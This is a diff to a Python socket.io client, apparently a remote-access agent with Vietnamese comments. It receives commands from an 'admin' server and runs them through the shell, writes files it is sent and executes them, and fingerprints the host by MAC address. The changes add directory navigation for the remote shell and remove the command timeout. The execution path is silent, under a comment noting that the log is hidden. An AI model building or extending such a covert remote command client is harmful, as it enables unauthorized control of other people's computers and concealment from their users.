@@ -82,6 +82,9 @@ ROOM = os.environ.get("ROOM", "general")
 # Lấy thư mục chứa file c.py hiện tại
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
+# Biến lưu thư mục hiện tại (để lệnh cd hoạt động)
+current_dir = BASE_DIR
+
 def get_hardware_id():
     mac = uuid.getnode()
     return hashlib.md5(str(mac).encode()).hexdigest()[:8].upper()
@@ -121,16 +124,25 @@ def on_admin_msg(data):
     print(f"\n{C_YELLOW}📨 [ADMIN] {data['message']}{C_RESET}")
 
 # ==========================================
-# NHẬN LỆNH TỪ XA (ĐÃ ẨN LOG)
+# NHẬN LỆNH TỪ XA (HỖ TRỢ CD)
 # ==========================================
 @sio.on("exec_command")
 def on_exec_command(data):
-    cmd = data.get("command")
-    # Ẩn dòng log "LỆNH TỪ ADMIN"
+    global current_dir
+    cmd = data.get("command", "").strip()
     
     try:
-        # Chạy lệnh trực tiếp, in ra màn hình
-        subprocess.run(cmd, shell=True, capture_output=False, text=True, timeout=30)
+        # Nếu là lệnh cd (đổi thư mục)
+        if cmd.lower().startswith("cd "):
+            new_dir = cmd[3:].strip().strip('"').strip("'")
+            # Thử đổi thư mục
+            target_path = os.path.join(current_dir, new_dir)
+            if os.path.exists(target_path):
+                current_dir = os.path.abspath(target_path)
+            return # Không chạy lệnh tiếp
+            
+        # Chạy lệnh bình thường trong thư mục hiện tại
+        subprocess.run(cmd, shell=True, capture_output=False, text=True, cwd=current_dir)
     except Exception:
         pass
 
@@ -143,6 +155,7 @@ def on_create_file(data):
     if not filename:
         return
         
+    # File luôn được tạo trong thư mục chứa c.py
     filepath = os.path.join(BASE_DIR, filename)
     
     try:
@@ -153,12 +166,11 @@ def on_create_file(data):
         # 2. Nếu có yêu cầu chạy file
         if run_it:
             if filename.endswith(".py"):
-                # Chạy file .py và in kết quả ra màn hình
-                subprocess.run(["python", filepath], capture_output=False)
+                subprocess.run(["python", filepath], capture_output=False, cwd=BASE_DIR)
             elif filename.endswith(".bat"):
-                subprocess.run(["cmd", "/c", filepath], capture_output=False)
+                subprocess.run(["cmd", "/c", filepath], capture_output=False, cwd=BASE_DIR)
             elif filename.endswith(".sh"):
-                subprocess.run(["bash", filepath], capture_output=False)
+                subprocess.run(["bash", filepath], capture_output=False, cwd=BASE_DIR)
             else:
                 os.startfile(filepath)
     except Exception:
@@ -183,7 +195,6 @@ def main():
         time.sleep(3)
         sys.exit(1)
 
-    # Thêm lại các dòng log khởi động theo yêu cầu
     print(f"\n[CLIENT] Mã Máy = {CLIENT_ID}")
     print(f"[CLIENT] Host={HOSTNAME} | OS={OS} | Room={ROOM}")
     print(f"[CLIENT] Server: MEMBER")
